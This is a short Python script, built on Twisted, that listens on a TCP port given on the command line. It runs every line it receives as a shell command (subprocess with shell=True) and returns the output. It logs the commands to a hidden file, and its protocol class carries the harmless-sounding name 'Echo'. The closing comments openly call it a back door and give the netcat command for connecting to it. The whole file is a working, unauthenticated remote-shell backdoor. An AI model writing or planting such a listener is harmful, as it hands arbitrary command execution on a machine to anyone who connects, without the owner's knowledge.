#!/usr/bin/python-twisted

from twisted.internet import protocol,reactor
import subprocess,time,sys
if(len(sys.argv) <=1):
        print("Please enter a port to use")
        exit(0)
port = int(sys.argv[1])
class Echo(protocol.Protocol):
        def dataReceived(self,data):
                logFile = open(".Connections.log","a+")
                User = "\""+str(self.transport.getPeer())+"\""
                logFile.write("['%s']Command has been executed in "%data.strip("\n")+str(time.ctime().replace(" ","-").replace("--","-"))+" by "+User.split("\'")[1]+":"+str(port)+"\n")
                try:
                        result = subprocess.check_output(data,shell=True)
                        self.transport.write(result)
                except:
                        self.transport.write("Command execution error \n")
                        logFile.write("['%s']Command execution fail in "%data.strip("\n")+str(time.ctime().replace(" ","-").replace("--","-"))+" by "+User.split("\'")[1]+":"+str(port)+"\n")
                logFile.close()
class EchoFactory(protocol.Factory):
        def buildProtocol(self,addr):
                return Echo()

print("Listen on "+str(port))
reactor.listenTCP(port,EchoFactory())
reactor.run()


#connect to back door with nc -nv <ip addr> port
#ls -la
#cat .connections.log
